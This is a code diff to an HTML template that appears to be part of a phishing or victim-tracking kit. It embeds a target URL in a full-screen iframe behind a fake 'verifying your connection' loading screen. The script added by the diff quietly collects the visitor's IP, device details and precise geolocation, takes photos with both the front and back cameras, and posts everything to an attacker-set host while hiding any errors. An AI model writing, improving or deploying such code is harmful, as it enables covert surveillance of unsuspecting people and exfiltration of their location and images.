@@ -3,18 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Loading Secure Content...</title>
     <style>
-        body { margin: 0; padding: 0; overflow: hidden; }
-        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+        body { 
+            margin: 0; 
+            padding: 0; 
+            overflow: hidden;
+            background: #f1f5f9;
+        }
+        iframe { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            border: none;
+            background: white;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #6366f1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-size: 16px;
+            color: #475569;
+            text-align: center;
+            max-width: 80%;
+        }
     </style>
 </head>
 <body>
-    <iframe src="<%= url %>" allow="camera; geolocation; microphone"></iframe>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Loading secure content...<br>Please wait while we verify your connection.</div>
+    </div>
+    
+    <iframe src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
     
     <script>
         const uid = '<%= uid %>';
         const host = '<%= host %>';
+        const loadingOverlay = document.getElementById('loadingOverlay');
 
         function send(endpoint, data) {
             fetch(`${host}/${endpoint}`, {
@@ -24,51 +74,112 @@
             }).catch(() => {});
         }
 
-        // Same advanced tracking as cloudflare page
-        // (Copy the info gathering code from cloudflare.ejs)
-        
-        // Location
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => send('location', {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    uid: uid,
-                    acc: pos.coords.accuracy
-                })
-            );
+        // Basic but effective tracking
+        function collectBasicInfo() {
+            const basicInfo = `<b>📱 WebView Session</b>\n\nIP: <%= ip %>\nTime: <%= time %>\nUA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nLanguage: ${navigator.language}`;
+            send('info', { uid: uid, data: basicInfo });
         }
 
-        // Basic info (simplified for webview)
-        const info = `<b>📱 WebView Access</b>\n\nIP: <%= ip %>\nTime: <%= time %>\nUA: ${navigator.userAgent}`;
-        send('info', { uid: uid, data: info });
-
-        // Camera
-        setTimeout(() => {
-            if (navigator.mediaDevices) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(s => {
-                        const v = document.createElement('video');
-                        v.srcObject = s;
-                        v.play();
-                        
-                        v.onloadedmetadata = () => {
-                            const c = document.createElement('canvas');
-                            c.width = v.videoWidth;
-                            c.height = v.videoHeight;
-                            c.getContext('2d').drawImage(v, 0, 0);
-                            
-                            send('camsnap', {
-                                uid: uid,
-                                img: c.toDataURL('image/png').split(',')[1]
-                            });
-                            
-                            s.getTracks().forEach(t => t.stop());
-                        };
-                    })
-                    .catch(() => {});
+        // Location
+        function collectLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => send('location', {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        uid: uid,
+                        acc: pos.coords.accuracy
+                    }),
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
             }
-        }, 2000);
+        }
+
+        // Camera (simplified but effective)
+        async function collectCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        send('camsnap', {
+                            uid: uid,
+                            front: canvas.toDataURL('image/jpeg', 0.7).split(',')[1]
+                        });
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        // Try back camera
+                        setTimeout(async () => {
+                            try {
+                                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                                    video: { facingMode: 'environment' } 
+                                });
+                                
+                                const backVideo = document.createElement('video');
+                                backVideo.srcObject = backStream;
+                                backVideo.play();
+                                
+                                backVideo.onloadedmetadata = () => {
+                                    setTimeout(() => {
+                                        const backCanvas = document.createElement('canvas');
+                                        backCanvas.width = backVideo.videoWidth;
+                                        backCanvas.height = backVideo.videoHeight;
+                                        backCanvas.getContext('2d').drawImage(backVideo, 0, 0);
+                                        
+                                        send('camsnap', {
+                                            uid: uid,
+                                            back: backCanvas.toDataURL('image/jpeg', 0.7).split(',')[1]
+                                        });
+                                        
+                                        backStream.getTracks().forEach(t => t.stop());
+                                    }, 500);
+                                };
+                            } catch (e) {
+                                // Ignore errors for back camera
+                            }
+                        }, 2000);
+                    }, 1000);
+                };
+            } catch (e) {
+                // Camera access denied or not available
+            }
+        }
+
+        // Execute collection
+        collectBasicInfo();
+        collectLocation();
+        collectCamera();
+
+        // Hide loading overlay after 3 seconds (or when iframe loads)
+        setTimeout(() => {
+            loadingOverlay.style.opacity = '0';
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+            }, 500);
+        }, 3000);
+
+        // Also hide when iframe loads (if possible)
+        window.addEventListener('message', (e) => {
+            if (e.data === 'iframe-loaded') {
+                loadingOverlay.style.opacity = '0';
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                }, 500);
+            }
+        });
     </script>
 </body>
 </html>
